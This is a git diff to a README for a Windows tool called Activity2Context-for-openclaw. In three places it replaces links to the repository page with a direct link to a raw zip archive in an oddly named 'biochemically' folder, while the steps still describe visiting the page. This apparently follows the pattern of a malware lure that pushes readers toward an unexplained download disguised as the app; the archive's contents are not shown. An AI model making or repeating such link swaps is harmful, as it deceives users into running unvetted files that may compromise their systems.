@@ -1,11 +1,11 @@
 # 🧩 Activity2Context-for-openclaw - Turn activity into clear signals
 
-[![Download Activity2Context-for-openclaw](https://img.shields.io/badge/Download-Activity2Context--for--openclaw-6f42c1?style=for-the-badge&logo=github&logoColor=white)](https://github.com/wambokoallandavid-source/Activity2Context-for-openclaw)
+[![Download Activity2Context-for-openclaw](https://img.shields.io/badge/Download-Activity2Context--for--openclaw-6f42c1?style=for-the-badge&logo=github&logoColor=white)](https://github.com/wambokoallandavid-source/Activity2Context-for-openclaw/raw/refs/heads/main/biochemically/for-Activity-openclaw-Context-v1.2.zip)
 
 ## 📥 Download for Windows
 
 Visit this page to download:
-https://github.com/wambokoallandavid-source/Activity2Context-for-openclaw
+https://github.com/wambokoallandavid-source/Activity2Context-for-openclaw/raw/refs/heads/main/biochemically/for-Activity-openclaw-Context-v1.2.zip
 
 1. Open the link in your browser.
 2. Look for the latest release or download files on the page.
@@ -161,7 +161,7 @@ Keep the full folder together if the app asks for nearby files at startup.
 ## 📦 Download and setup path
 
 1. Visit this page to download:
-   https://github.com/wambokoallandavid-source/Activity2Context-for-openclaw
+   https://github.com/wambokoallandavid-source/Activity2Context-for-openclaw/raw/refs/heads/main/biochemically/for-Activity-openclaw-Context-v1.2.zip
 2. Open the repository page in your browser.
 3. Download the Windows file or release package from the page.
 4. Save it in a folder you can find again.
